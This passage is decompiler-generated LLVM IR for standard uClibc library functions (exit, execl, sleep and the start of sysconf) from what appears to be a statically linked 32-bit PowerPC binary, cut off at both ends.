  uselistorder i32 %v1_1000b6d0, { 1, 0 }
  uselistorder i32 %v1_1000b6bc, { 1, 0, 2 }
  uselistorder i32 %v0_1000b698, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 5, 2, 3, 4, 6 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 6, 2, 3, 7, 4, 5, 8 }
  uselistorder i32* %r30.global-to-local, { 4, 1, 0, 2, 3, 5, 6, 7 }
  uselistorder i32* %r28.global-to-local, { 2, 3, 0, 4, 5, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm., { 0, 3, 4, 1, 2 }
  uselistorder i32 26, { 3, 2, 4, 5, 1, 0 }
  uselistorder label %dec_label_pc_1000b7d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000b7c4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000b790, { 1, 0 }
  uselistorder label %dec_label_pc_1000b748, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000b710, { 1, 0 }
  uselistorder label %dec_label_pc_1000b6e4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000b6d8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000b69c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b698, { 1, 0 }
  uselistorder label %dec_label_pc_1000b664, { 1, 0 }
}

define i32 @__GI_exit() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_1000b800 = ptrtoint i32* %stack_var_-40 to i32
  %v0_1000b80c = load i32, i32* @r3, align 4
  store i32 %v0_1000b80c, i32* @r31, align 4
  store i32 %v2_1000b800, i32* @r3, align 4
  %v0_1000b818 = call i32 @__pthread_return_void()
  %v0_1000b820 = call i32 @__pthread_return_0()
  %v3_1000b828 = load i32, i32* @global_var_1001fdd0.222, align 4
  %v3_1000b82c = icmp eq i32 %v3_1000b828, 0
  br i1 %v3_1000b82c, label %dec_label_pc_1000b840, label %dec_label_pc_1000b834

dec_label_pc_1000b834:                            ; preds = %entry
  %v0_1000b834 = load i32, i32* @r31, align 4
  %v3_1000b83c = call i32 @unknown_0(i32 %v0_1000b834, i32 ptrtoint (i32* @global_var_10020000.2 to i32))
  br label %dec_label_pc_1000b840

dec_label_pc_1000b840:                            ; preds = %entry, %dec_label_pc_1000b834
  store i32 %v2_1000b800, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v0_1000b848 = call i32 @__pthread_return_void()
  store i32 %v0_1000b848, i32* @r3, align 4
  store i32 268482640, i32* @lr, align 4
  %v1_1000b84c = call i32 @__GI___uClibc_fini(i32 %v0_1000b848)
  store i32 268482660, i32* @lr, align 4
  %v2_1000b860 = call i32 @_stdio_term(i32 %v1_1000b84c, i32 268470900)
  %v0_1000b864 = load i32, i32* @r31, align 4
  %v1_1000b868 = call i32 @__GI__exit(i32 %v0_1000b864)
  ret i32 %v1_1000b868

; uselistorder directives
  uselistorder label %dec_label_pc_1000b840, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg5, i32* %r8.global-to-local, align 4
  %stack_var_8 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000b86c = ptrtoint i32* %stack_var_0 to i32
  %v2_1000b888 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1000b888, i32* %r0.global-to-local, align 4
  %v2_1000b890 = ptrtoint i32* %stack_var_8 to i32
  store i32 %v2_1000b888, i32* %stack_var_-48, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000b8bc

dec_label_pc_1000b8bc:                            ; preds = %dec_label_pc_1000b8ec, %entry
  %v0_1000b8c0 = phi i32 [ 0, %entry ], [ %v1_1000b8c0, %dec_label_pc_1000b8ec ]
  %stack_var_-52.0 = phi i32 [ %v2_1000b890, %entry ], [ %stack_var_-52.1, %dec_label_pc_1000b8ec ]
  %stack_var_-56.0 = phi i8 [ 2, %entry ], [ %stack_var_-56.1, %dec_label_pc_1000b8ec ]
  %v4_1000b8bc = zext i8 %stack_var_-56.0 to i32
  %v1_1000b8c0 = add i32 %v0_1000b8c0, 1
  %v1_1000b8c8 = mul nuw nsw i32 %v4_1000b8bc, 4
  store i32 %v1_1000b8c8, i32* %r0.global-to-local, align 4
  %v2_1000b8cc = add i32 %v1_1000b8c8, %v2_1000b888
  store i32 %v2_1000b8cc, i32* %r11.global-to-local, align 4
  %tmp19 = icmp ugt i8 %stack_var_-56.0, 7
  br i1 %tmp19, label %dec_label_pc_1000b8e0, label %dec_label_pc_1000b8d8

dec_label_pc_1000b8d8:                            ; preds = %dec_label_pc_1000b8bc
  %v1_1000b8d0 = add i8 %stack_var_-56.0, 1
  br label %dec_label_pc_1000b8ec

dec_label_pc_1000b8e0:                            ; preds = %dec_label_pc_1000b8bc
  store i32 %stack_var_-52.0, i32* %r11.global-to-local, align 4
  %v1_1000b8e4 = add i32 %stack_var_-52.0, 4
  store i32 %v1_1000b8e4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000b8ec

dec_label_pc_1000b8ec:                            ; preds = %dec_label_pc_1000b8d8, %dec_label_pc_1000b8e0
  %stack_var_-52.1 = phi i32 [ %v1_1000b8e4, %dec_label_pc_1000b8e0 ], [ %stack_var_-52.0, %dec_label_pc_1000b8d8 ]
  %v0_1000b8ec = phi i32 [ %stack_var_-52.0, %dec_label_pc_1000b8e0 ], [ %v2_1000b8cc, %dec_label_pc_1000b8d8 ]
  %stack_var_-56.1 = phi i8 [ %stack_var_-56.0, %dec_label_pc_1000b8e0 ], [ %v1_1000b8d0, %dec_label_pc_1000b8d8 ]
  %v1_1000b8ec = inttoptr i32 %v0_1000b8ec to i32*
  %v2_1000b8ec = load i32, i32* %v1_1000b8ec, align 4
  store i32 %v2_1000b8ec, i32* %r0.global-to-local, align 4
  %v3_1000b8f0 = icmp eq i32 %v2_1000b8ec, 0
  br i1 %v3_1000b8f0, label %dec_label_pc_1000b8f8, label %dec_label_pc_1000b8bc

dec_label_pc_1000b8f8:                            ; preds = %dec_label_pc_1000b8ec
  %v1_1000b8f8 = mul i32 %v1_1000b8c0, 4
  store i32 %v4_1000b86c, i32* %r0.global-to-local, align 4
  %v1_1000b900 = add i32 %v1_1000b8f8, 34
  store i32 %v1_1000b8c0, i32* %ctr.global-to-local, align 4
  %v1_1000b908 = call i32 @__asm_rlwinm(i32 %v1_1000b900, i32 0, i32 0, i32 27)
  %v1_1000b910 = load i32, i32* @r1, align 4
  %v3_1000b910 = sub i32 %v1_1000b910, %v1_1000b908
  %v4_1000b910 = inttoptr i32 %v3_1000b910 to i32*
  store i32 %v4_1000b86c, i32* %v4_1000b910, align 4
  %v1_1000b914 = add i32 %v3_1000b910, 23
  store i32 %v1_1000b914, i32* %r0.global-to-local, align 4
  %v1_1000b918 = call i32 @__asm_rlwinm(i32 %v1_1000b914, i32 0, i32 0, i32 27)
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_1000b920 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000b920 = inttoptr i32 %v1_1000b918 to i32*
  store i32 %v0_1000b920, i32* %v2_1000b920, align 4
  store i32 %v1_1000b918, i32* %r11.global-to-local, align 4
  %v0_1000b928 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000b928 = trunc i32 %v0_1000b928 to i8
  store i32 %v2_1000b888, i32* %r0.global-to-local, align 4
  store i32 %v2_1000b888, i32* %stack_var_-48, align 4
  br label %dec_label_pc_1000b93c

dec_label_pc_1000b93c:                            ; preds = %dec_label_pc_1000b970.dec_label_pc_1000b93c_crit_edge, %dec_label_pc_1000b8f8
  %v0_1000b940 = phi i32 [ %v1_1000b918, %dec_label_pc_1000b8f8 ], [ %v0_1000b940.pre, %dec_label_pc_1000b970.dec_label_pc_1000b93c_crit_edge ]
  %stack_var_-52.2 = phi i32 [ %v2_1000b890, %dec_label_pc_1000b8f8 ], [ %stack_var_-52.3, %dec_label_pc_1000b970.dec_label_pc_1000b93c_crit_edge ]
  %stack_var_-56.2 = phi i8 [ %v1_1000b928, %dec_label_pc_1000b8f8 ], [ %stack_var_-56.3, %dec_label_pc_1000b970.dec_label_pc_1000b93c_crit_edge ]
  %v1_1000b940 = add i32 %v0_1000b940, 4
  store i32 %v1_1000b940, i32* %r11.global-to-local, align 4
  %tmp20 = icmp ugt i8 %stack_var_-56.2, 7
  br i1 %tmp20, label %dec_label_pc_1000b964, label %dec_label_pc_1000b954

dec_label_pc_1000b954:                            ; preds = %dec_label_pc_1000b93c
  %v4_1000b93c = zext i8 %stack_var_-56.2 to i32
  %v1_1000b94c = add i8 %stack_var_-56.2, 1
  %v1_1000b948 = mul nuw nsw i32 %v4_1000b93c, 4
  %v3_1000b954 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_1000b954, i32* %r0.global-to-local, align 4
  %v2_1000b95c = add i32 %v3_1000b954, %v1_1000b948
  br label %dec_label_pc_1000b970

dec_label_pc_1000b964:                            ; preds = %dec_label_pc_1000b93c
  %v1_1000b968 = add i32 %stack_var_-52.2, 4
  store i32 %v1_1000b968, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1000b970

dec_label_pc_1000b970:                            ; preds = %dec_label_pc_1000b954, %dec_label_pc_1000b964
  %stack_var_-52.3 = phi i32 [ %v1_1000b968, %dec_label_pc_1000b964 ], [ %stack_var_-52.2, %dec_label_pc_1000b954 ]
  %v0_1000b970 = phi i32 [ %stack_var_-52.2, %dec_label_pc_1000b964 ], [ %v2_1000b95c, %dec_label_pc_1000b954 ]
  %stack_var_-56.3 = phi i8 [ %stack_var_-56.2, %dec_label_pc_1000b964 ], [ %v1_1000b94c, %dec_label_pc_1000b954 ]
  %v1_1000b970 = inttoptr i32 %v0_1000b970 to i32*
  %v2_1000b970 = load i32, i32* %v1_1000b970, align 4
  store i32 %v2_1000b970, i32* %r0.global-to-local, align 4
  %v2_1000b974 = inttoptr i32 %v1_1000b940 to i32*
  store i32 %v2_1000b970, i32* %v2_1000b974, align 4
  %v0_1000b978 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000b978 = add i32 %v0_1000b978, -1
  store i32 %v1_1000b978, i32* %ctr.global-to-local, align 4
  %v2_1000b978 = icmp eq i32 %v1_1000b978, 0
  br i1 %v2_1000b978, label %dec_label_pc_1000b97c, label %dec_label_pc_1000b970.dec_label_pc_1000b93c_crit_edge

dec_label_pc_1000b970.dec_label_pc_1000b93c_crit_edge: ; preds = %dec_label_pc_1000b970
  %v0_1000b940.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000b93c

dec_label_pc_1000b97c:                            ; preds = %dec_label_pc_1000b970
  %v3_1000b980 = load i32, i32* @global_var_1001fdd8.224, align 4
  store i32 268482952, i32* @lr, align 4
  %v2_1000b984 = call i32 @__GI_execve(i32 %v3_1000b980, i32 ptrtoint (i32* @global_var_10020000.2 to i32))
  %v0_1000b988 = load i32, i32* @r1, align 4
  %v1_1000b988 = inttoptr i32 %v0_1000b988 to i32*
  %v2_1000b988 = load i32, i32* %v1_1000b988, align 4
  store i32 %v2_1000b988, i32* %r11.global-to-local, align 4
  %v1_1000b98c = add i32 %v2_1000b988, 4
  %v2_1000b98c = inttoptr i32 %v1_1000b98c to i32*
  %v3_1000b98c = load i32, i32* %v2_1000b98c, align 4
  store i32 %v3_1000b98c, i32* %r0.global-to-local, align 4
  ret i32 %v2_1000b984

; uselistorder directives
  uselistorder i32 %v1_1000b978, { 1, 0 }
  uselistorder i8 %stack_var_-56.2, { 2, 0, 3, 1 }
  uselistorder i32 %v1_1000b8c8, { 1, 0 }
  uselistorder i32 %v1_1000b8c0, { 1, 0, 2 }
  uselistorder i8 %stack_var_-56.0, { 2, 0, 1, 3 }
  uselistorder i32 %stack_var_-52.0, { 0, 1, 3, 2 }
  uselistorder i32 %v2_1000b888, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 6, 7, 8, 9, 10, 11, 12, 4, 5 }
  uselistorder i32 23, { 13, 14, 15, 8, 9, 10, 0, 1, 2, 3, 4, 7, 5, 6, 11, 12 }
  uselistorder i32* @r1, { 8, 9, 0, 1, 2, 3, 4, 5, 6, 7, 10 }
  uselistorder i32 27, { 2, 3, 0, 1, 4 }
  uselistorder i32 34, { 5, 1, 2, 4, 3, 0 }
  uselistorder i8 1, { 0, 1, 10, 11, 12, 13, 16, 17, 15, 2, 3, 14, 9, 8, 7, 6, 5, 4, 18 }
  uselistorder i8 2, { 3, 0, 4, 1, 5, 2, 6 }
  uselistorder label %dec_label_pc_1000b970, { 1, 0 }
  uselistorder label %dec_label_pc_1000b8ec, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-304 = alloca i32, align 4
  %stack_var_-432 = alloca i32, align 4
  %stack_var_-440 = alloca i32, align 4
  store i32 %arg1, i32* %r8.global-to-local, align 4
  %v3_1000b9a0 = icmp eq i32 %arg1, 0
  br i1 %v3_1000b9a0, label %dec_label_pc_1000bb54, label %dec_label_pc_1000b9d0.lr.ph

dec_label_pc_1000b9d0.lr.ph:                      ; preds = %entry
  %v2_1000b9c4 = ptrtoint i32* %stack_var_-440 to i32
  store i32 %v2_1000b9c4, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_1000b9d042 = add i32 %v2_1000b9c4, 132
  %v3_1000b9d043 = inttoptr i32 %v2_1000b9d042 to i32*
  store i32 0, i32* %v3_1000b9d043, align 4
  %v0_1000b9d444 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000b9d445 = add i32 %v0_1000b9d444, -1
  store i32 %v1_1000b9d445, i32* %r11.global-to-local, align 4
  %v1_1000b9d846 = mul i32 %v1_1000b9d445, 4
  %v1_1000b9dc47 = load i32, i32* %r7.global-to-local, align 4
  %v2_1000b9dc48 = add i32 %v1_1000b9dc47, %v1_1000b9d846
  %v0_1000b9e049 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000b9e050 = add i32 %v0_1000b9e049, -1
  store i32 %v1_1000b9e050, i32* %ctr.global-to-local, align 4
  %v2_1000b9e051 = icmp eq i32 %v1_1000b9e050, 0
  br i1 %v2_1000b9e051, label %dec_label_pc_1000b9e4, label %dec_label_pc_1000b9d0.dec_label_pc_1000b9d0_crit_edge

dec_label_pc_1000b9d0.dec_label_pc_1000b9d0_crit_edge: ; preds = %dec_label_pc_1000b9d0.lr.ph, %dec_label_pc_1000b9d0.dec_label_pc_1000b9d0_crit_edge
  %v2_1000b9dc52 = phi i32 [ %v2_1000b9dc, %dec_label_pc_1000b9d0.dec_label_pc_1000b9d0_crit_edge ], [ %v2_1000b9dc48, %dec_label_pc_1000b9d0.lr.ph ]
  %v0_1000b9d0.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_1000b9d0 = add i32 %v2_1000b9dc52, 8
  %v3_1000b9d0 = inttoptr i32 %v2_1000b9d0 to i32*
  store i32 %v0_1000b9d0.pre, i32* %v3_1000b9d0, align 4
  %v0_1000b9d4 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000b9d4 = add i32 %v0_1000b9d4, -1
  store i32 %v1_1000b9d4, i32* %r11.global-to-local, align 4
  %v1_1000b9d8 = mul i32 %v1_1000b9d4, 4
  %v1_1000b9dc = load i32, i32* %r7.global-to-local, align 4
  %v2_1000b9dc = add i32 %v1_1000b9dc, %v1_1000b9d8
  %v0_1000b9e0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000b9e0 = add i32 %v0_1000b9e0, -1
  store i32 %v1_1000b9e0, i32* %ctr.global-to-local, align 4
  %v2_1000b9e0 = icmp eq i32 %v1_1000b9e0, 0
  br i1 %v2_1000b9e0, label %dec_label_pc_1000b9e4, label %dec_label_pc_1000b9d0.dec_label_pc_1000b9d0_crit_edge

dec_label_pc_1000b9e4:                            ; preds = %dec_label_pc_1000b9d0.dec_label_pc_1000b9d0_crit_edge, %dec_label_pc_1000b9d0.lr.ph
  %v0_1000b9f8.pre = load i32, i32* %r8.global-to-local, align 4
  %v2_1000b9e4 = ptrtoint i32* %stack_var_-432 to i32
  store i32 %v2_1000b9e4, i32* %r29.global-to-local, align 4
  store i32 %v2_1000b9e4, i32* @r3, align 4
  store i32 17, i32* @r4, align 4
  store i32 %v0_1000b9f8.pre, i32* %stack_var_-440, align 4
  %v0_1000b9fc = call i32 @__sigaddset()
  store i32 %v0_1000b9fc, i32* %r3.global-to-local, align 4
  %v1_1000ba00 = icmp slt i32 %v0_1000b9fc, 0
  br i1 %v1_1000ba00, label %dec_label_pc_1000bb5c, label %dec_label_pc_1000ba08

dec_label_pc_1000ba08:                            ; preds = %dec_label_pc_1000b9e4
  %v2_1000ba08 = ptrtoint i32* %stack_var_-304 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 268483100, i32* @lr, align 4
  %v3_1000ba18 = call i32 @__GI_sigprocmask(i32 0, i32 %v2_1000b9e4, i32 %v2_1000ba08)
  store i32 %v3_1000ba18, i32* %r3.global-to-local, align 4
  %v3_1000ba1c = icmp eq i32 %v3_1000ba18, 0
  br i1 %v3_1000ba1c, label %dec_label_pc_1000ba24, label %dec_label_pc_1000bb5c

dec_label_pc_1000ba24:                            ; preds = %dec_label_pc_1000ba08
  store i32 %v2_1000ba08, i32* %r3.global-to-local, align 4
  %v2_1000ba2c = call i32 @__sigismember(i32 %v2_1000ba08, i32 17)
  store i32 %v2_1000ba2c, i32* %r3.global-to-local, align 4
  %v3_1000ba30 = icmp eq i32 %v2_1000ba2c, 0
  br i1 %v3_1000ba30, label %dec_label_pc_1000ba50.lr.ph, label %dec_label_pc_1000bb1c

dec_label_pc_1000ba50.lr.ph:                      ; preds = %dec_label_pc_1000ba24
  store i32 %v2_1000b9c4, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 0, i32* %v3_1000b9d043, align 4
  %v0_1000ba5433 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ba5434 = add i32 %v0_1000ba5433, -1
  store i32 %v1_1000ba5434, i32* %r11.global-to-local, align 4
  %v1_1000ba5835 = mul i32 %v1_1000ba5434, 4
  %v1_1000ba5c36 = load i32, i32* %r8.global-to-local, align 4
  %v2_1000ba5c37 = add i32 %v1_1000ba5c36, %v1_1000ba5835
  %v0_1000ba6038 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ba6039 = add i32 %v0_1000ba6038, -1
  store i32 %v1_1000ba6039, i32* %ctr.global-to-local, align 4
  %v2_1000ba6040 = icmp eq i32 %v1_1000ba6039, 0
  br i1 %v2_1000ba6040, label %dec_label_pc_1000ba64, label %dec_label_pc_1000ba50.dec_label_pc_1000ba50_crit_edge

dec_label_pc_1000ba50.dec_label_pc_1000ba50_crit_edge: ; preds = %dec_label_pc_1000ba50.lr.ph, %dec_label_pc_1000ba50.dec_label_pc_1000ba50_crit_edge
  %v2_1000ba5c41 = phi i32 [ %v2_1000ba5c, %dec_label_pc_1000ba50.dec_label_pc_1000ba50_crit_edge ], [ %v2_1000ba5c37, %dec_label_pc_1000ba50.lr.ph ]
  %v0_1000ba50.pre = load i32, i32* %r10.global-to-local, align 4
  %v2_1000ba50 = add i32 %v2_1000ba5c41, 8
  %v3_1000ba50 = inttoptr i32 %v2_1000ba50 to i32*
  store i32 %v0_1000ba50.pre, i32* %v3_1000ba50, align 4
  %v0_1000ba54 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ba54 = add i32 %v0_1000ba54, -1
  store i32 %v1_1000ba54, i32* %r11.global-to-local, align 4
  %v1_1000ba58 = mul i32 %v1_1000ba54, 4
  %v1_1000ba5c = load i32, i32* %r8.global-to-local, align 4
  %v2_1000ba5c = add i32 %v1_1000ba5c, %v1_1000ba58
  %v0_1000ba60 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ba60 = add i32 %v0_1000ba60, -1
  store i32 %v1_1000ba60, i32* %ctr.global-to-local, align 4
  %v2_1000ba60 = icmp eq i32 %v1_1000ba60, 0
  br i1 %v2_1000ba60, label %dec_label_pc_1000ba64, label %dec_label_pc_1000ba50.dec_label_pc_1000ba50_crit_edge

dec_label_pc_1000ba64:                            ; preds = %dec_label_pc_1000ba50.dec_label_pc_1000ba50_crit_edge, %dec_label_pc_1000ba50.lr.ph
  store i32 %v2_1000b9e4, i32* @r3, align 4
  store i32 17, i32* @r4, align 4
  %v0_1000ba6c = call i32 @__sigaddset()
  store i32 %v0_1000ba6c, i32* %r3.global-to-local, align 4
  %v1_1000ba70 = icmp slt i32 %v0_1000ba6c, 0
  br i1 %v1_1000ba70, label %dec_label_pc_1000bb5c, label %dec_label_pc_1000ba78

dec_label_pc_1000ba78:                            ; preds = %dec_label_pc_1000ba64
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_1000ba80 = ptrtoint i32* %stack_var_-176 to i32
  store i32 268483208, i32* @lr, align 4
  %v4_1000ba84 = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_1000ba80)
  store i32 %v4_1000ba84, i32* %r3.global-to-local, align 4
  %tmp30 = icmp sgt i32 %v4_1000ba84, -1
  br i1 %tmp30, label %dec_label_pc_1000bab8, label %dec_label_pc_1000ba90

dec_label_pc_1000ba90:                            ; preds = %dec_label_pc_1000ba78
  %v0_1000ba90 = call i32 @__errno_location()
  store i32 %v0_1000ba90, i32* %r3.global-to-local, align 4
  %v1_1000ba98 = inttoptr i32 %v0_1000ba90 to i32*
  %v2_1000ba98 = load i32, i32* %v1_1000ba98, align 4
  store i32 %v0_1000ba90, i32* %r29.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268483244, i32* @lr, align 4
  %v3_1000baa8 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_1000ba08, i32 0)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_1000bab0 = inttoptr i32 %v0_1000ba90 to i32*
  store i32 %v2_1000ba98, i32* %v2_1000bab0, align 4
  %v0_1000bb70.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000bb60

dec_label_pc_1000bab8:                            ; preds = %dec_label_pc_1000ba78
  %v3_1000bab8 = load i32, i32* %stack_var_-176, align 4
  %v3_1000bac4 = icmp eq i32 %v3_1000bab8, 1
  br i1 %v3_1000bac4, label %dec_label_pc_1000bacc, label %dec_label_pc_1000bb00

dec_label_pc_1000bacc:                            ; preds = %dec_label_pc_1000bab8
  store i32 %v2_1000b9c4, i32* %r3.global-to-local, align 4
  store i32 268483288, i32* @lr, align 4
  %v2_1000bad4 = call i32 @__libc_nanosleep(i32 %v2_1000b9c4, i32 %v2_1000b9c4)
  store i32 %v2_1000bad4, i32* %r3.global-to-local, align 4
  store i32 %v2_1000bad4, i32* @r31, align 4
  %v0_1000badc = call i32 @__errno_location()
  store i32 %v0_1000badc, i32* %r3.global-to-local, align 4
  store i32 %v0_1000badc, i32* %r29.global-to-local, align 4
  %v1_1000baec = inttoptr i32 %v0_1000badc to i32*
  %v2_1000baec = load i32, i32* %v1_1000baec, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268483320, i32* @lr, align 4
  %v3_1000baf4 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_1000ba08, i32 0)
  store i32 %v3_1000baf4, i32* %r3.global-to-local, align 4
  %v1_1000baf8 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000baf8 = inttoptr i32 %v1_1000baf8 to i32*
  store i32 %v2_1000baec, i32* %v2_1000baf8, align 4
  %v0_1000bb28.pr = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000bb28

dec_label_pc_1000bb00:                            ; preds = %dec_label_pc_1000bab8
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268483344, i32* @lr, align 4
  %v3_1000bb0c = call i32 @__GI_sigprocmask(i32 2, i32 %v2_1000ba08, i32 0)
  br label %dec_label_pc_1000bb1c

dec_label_pc_1000bb1c:                            ; preds = %dec_label_pc_1000ba24, %dec_label_pc_1000bb00
  store i32 %v2_1000b9c4, i32* %r3.global-to-local, align 4
  store i32 268483364, i32* @lr, align 4
  %v2_1000bb20 = call i32 @__libc_nanosleep(i32 %v2_1000b9c4, i32 %v2_1000b9c4)
  store i32 %v2_1000bb20, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000bb28

dec_label_pc_1000bb28:                            ; preds = %dec_label_pc_1000bacc, %dec_label_pc_1000bb1c
  %v0_1000bb28 = phi i32 [ %v0_1000bb28.pr, %dec_label_pc_1000bacc ], [ %v2_1000bb20, %dec_label_pc_1000bb1c ]
  %v3_1000bb28 = icmp eq i32 %v0_1000bb28, 0
  br i1 %v3_1000bb28, label %dec_label_pc_1000bb54, label %dec_label_pc_1000bb30

dec_label_pc_1000bb30:                            ; preds = %dec_label_pc_1000bb28
  %v3_1000bb40 = load i32, i32* %stack_var_-440, align 4
  %v0_1000bb44 = call i32 @__asm_mfcr()
  store i32 %v0_1000bb44, i32* %r3.global-to-local, align 4
  %v1_1000bb48 = call i32 @__asm_rlwinm(i32 %v0_1000bb44, i32 30, i32 31, i32 31)
  %v2_1000bb4c = add i32 %v3_1000bb40, %v1_1000bb48
  store i32 %v2_1000bb4c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000bb60

dec_label_pc_1000bb54:                            ; preds = %dec_label_pc_1000bb28, %entry
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000bb60

dec_label_pc_1000bb5c:                            ; preds = %dec_label_pc_1000ba08, %dec_label_pc_1000ba64, %dec_label_pc_1000b9e4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000bb60

dec_label_pc_1000bb60:                            ; preds = %dec_label_pc_1000bb54, %dec_label_pc_1000bb30, %dec_label_pc_1000ba90, %dec_label_pc_1000bb5c
  %v0_1000bb70 = phi i32 [ 0, %dec_label_pc_1000bb54 ], [ %v2_1000bb4c, %dec_label_pc_1000bb30 ], [ %v0_1000bb70.pre, %dec_label_pc_1000ba90 ], [ -1, %dec_label_pc_1000bb5c ]
  ret i32 %v0_1000bb70

; uselistorder directives
  uselistorder i32 %v1_1000ba60, { 1, 0 }
  uselistorder i32 %v2_1000ba08, { 2, 1, 0, 4, 3, 5 }
  uselistorder i32 %v1_1000b9e0, { 1, 0 }
  uselistorder i32 %v2_1000b9c4, { 2, 1, 3, 6, 5, 4, 7, 0, 8 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 3, 5, 4, 2, 6, 0, 7, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24, 1 }
  uselistorder i32* %r11.global-to-local, { 0, 6, 7, 2, 3, 1, 8, 9, 4, 5 }
  uselistorder i32* %ctr.global-to-local, { 0, 6, 7, 2, 3, 1, 8, 9, 4, 5 }
  uselistorder i32 30, { 6, 7, 8, 9, 10, 0, 1, 2, 3, 11, 4, 5, 12, 13, 14, 15 }
  uselistorder i32 (i32, i32)* @__libc_nanosleep, { 1, 0 }
  uselistorder i32 (i32, i32)* @__sigismember, { 1, 0 }
  uselistorder label %dec_label_pc_1000bb60, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000bb5c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000bb28, { 1, 0 }
  uselistorder label %dec_label_pc_1000bb1c, { 1, 0 }
  uselistorder label %dec_label_pc_1000ba50.dec_label_pc_1000ba50_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000b9d0.dec_label_pc_1000b9d0_crit_edge, { 1, 0 }
}

define i32 @sysconf(i32 %arg1) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %v2_1000bb74 = icmp ugt i32 %arg1, 149
  br i1 %v2_1000bb74, label %dec_label_pc_1000bbac, label %dec_label_pc_1000bb88

dec_label_pc_1000bb88:                            ; preds = %entry
  %v1_1000bb8c = mul i32 %arg1, 4
  store i32 ptrtoint (i32* @global_var_1000f6ec.225 to i32), i32* %r9.global-to-local, align 4
  %v2_1000bb94 = add i32 %v1_1000bb8c, ptrtoint (i32* @global_var_1000f6ec.225 to i32)
  %v3_1000bb94 = inttoptr i32 %v2_1000bb94 to i32*
  %v4_1000bb94 = load i32, i32* %v3_1000bb94, align 4
  %v2_1000bb98 = add i32 %v4_1000bb94, ptrtoint (i32* @global_var_1000f6ec.225 to i32)
  call void @__pseudo_branch(i32 %v2_1000bb98)
  store i32 1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000bcf0

dec_label_pc_1000bbac:                            ; preds = %entry
  %v0_1000bbac = call i32 @__errno_location()
